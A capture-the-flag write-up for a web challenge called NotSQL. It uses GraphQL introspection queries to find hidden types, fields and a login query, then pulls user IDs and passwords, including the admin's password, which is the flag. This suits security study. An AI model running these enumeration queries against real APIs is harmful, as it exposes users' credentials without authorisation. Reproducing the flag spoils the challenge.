---
layout: default
title: NotSQL
---

# Webhacking NotSQL Solution

In this challenge we exploit vulnerabilities in `GraphQL`


First we get all of the types: 
```json
{__schema{types{name}}}
```
```json
{
  "data": {
    "__schema": {
      "types": [
        {"name": "Board"},
        {"name": "Int"},
        {"name": "String"},
        {"name": "User_d51e7f78cbb219316e0b7cfe1a64540a"}, // INTERESTING
        {"name": "Query"},
        {"name": "CacheControlScope"},
        {"name": "Upload"},
        {"name": "Boolean"},
        {"name": "__Schema"},
        {"name": "__Type"},
        {"name": "__TypeKind"},
        {"name": "__Field"},
        {"name": "__InputValue"},
        {"name": "__EnumValue"},
        {"name": "__Directive"},
        {"name": "__DirectiveLocation"}
      ]
    }
  }
}
```

next, we want to find the fields of this type:
```json
{__type(name:"User_d51e7f78cbb219316e0b7cfe1a64540a"){fields{name}}}
```

```json
{
  "data": {
    "__type": {
      "fields": [
        {"name": "userid_a7fce99fa52d173843130a9620a787ce"},
        {"name": "passwd_e31db968948082b92e60411dd15a25cd"}
      ]
    }
  }
}
```

Now, we will check what are the available queries.
```json
{__type(name:"Query"){fields{name}}}
```
```json
{
  "data": {
    "__type": {
      "fields": [
        {"name": "view"},
        {"name": "login_51b48f6f7e6947fba0a88a7147d54152"}
      ]
    }
  }
}
```

OK, so there is a query that's called: `login_51b48f6f7e6947fba0a88a7147d54152`, and we know the name of the fields. let's try to give them to the query:
```json
{login_51b48f6f7e6947fba0a88a7147d54152{userid_a7fce99fa52d173843130a9620a787ce,passwd_e31db968948082b92e60411dd15a25cd}}
```

```json
{
  "data": {
    "login_51b48f6f7e6947fba0a88a7147d54152": [
      {
        "userid_a7fce99fa52d173843130a9620a787ce": "test-user",
        "passwd_e31db968948082b92e60411dd15a25cd": "test-password"
      },
      {
        "userid_a7fce99fa52d173843130a9620a787ce": "admin",
        "passwd_e31db968948082b92e60411dd15a25cd": "FLAG{i_know_how_to_use_graphql}" // <---
      }
    ]
  }
}
```

![FLAG](./images/NotSQL.png)

**Flag:** ***`FLAG{i_know_how_to_use_graphql}`*** 

